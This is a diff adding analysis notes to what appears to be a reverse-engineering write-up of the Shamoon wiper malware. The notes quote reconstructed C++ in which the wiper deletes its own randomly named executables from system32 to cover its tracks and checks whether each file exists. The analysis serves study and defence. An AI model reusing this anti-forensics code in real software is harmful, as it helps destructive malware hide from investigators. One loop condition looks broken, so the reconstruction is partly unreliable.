@@ -430,3 +430,51 @@ void Shamoon::Modules::Wiper::DeleteWiperModules()
 
 bool Shamoon::Modules::Wiper::GetWiperSpecific(WCHAR *szSvcName, WCHAR *szSvcPath)
 ```
+The sole purpose of this module appears to be covering tracks; it appears that all executables are deleted on system root
+```
+do
+	{
+		// Get the module absolute path
+		M_STRING04
+		(
+			szSvcPath,
+			
+			g_szWinDir,
+			L"\\system32\\",
+			szSvcName,
+			L".exe"
+		)
+		
+		// Delete the module if exists
+		DeleteFileW(szSvcPath);
+		
+		// Next random name
+		szSvcName += 15;
+	}
+	while(szSvcName < &szSvcName[29]);
+}
+```
+where the files to delete come from the SVC
+
+The second function appears to do the same thing, but by first getting a random module name
+```
+M_STRING02
+(
+	szSvcName,
+			
+	g_random_svc_name[Shamoon::Utils::GetRandom() % 29],
+	L".exe"
+)		
+```
+and checking if it already exists. If it doesn't, then the loop can break as the module doesn't need to be deleted.
+```
+EXECUTE_WOW64_FILE_OPERATION
+(
+	hFileHandle = CreateFileW(szSvcPath, 0x80000000, 7, 0, 3, 0x100000, 0);
+	nLastError   = GetLastError();
+)
+		
+// If not, break the loop
+if(hFileHandle == INVALID_HANDLE_VALUE && nLastError == ERROR_FILE_NOT_FOUND)
+	break;
+```
